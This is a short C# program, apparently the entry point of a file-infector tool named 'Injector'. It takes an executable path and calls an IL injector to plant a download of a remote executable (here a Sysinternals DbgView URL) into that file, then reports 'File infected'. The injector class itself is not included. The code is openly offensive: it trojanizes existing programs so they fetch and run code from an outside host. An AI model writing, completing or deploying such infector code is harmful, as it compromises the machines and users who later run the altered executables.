using System;
using System.IO;

namespace Injector
{
    internal class Program
    {
        private static void Main(string[] args)
        {
            if ((args.Length <= 0) || (! File.Exists(args[0])))
                return;

            bool injectSuccess = new IlInjector().InjectToExecutable(args[0], "http://live.sysinternals.com/Dbgview.exe");
            Console.WriteLine(injectSuccess ? "File infected" : "Failed to infect file");

            Console.Read();
        }
    }
}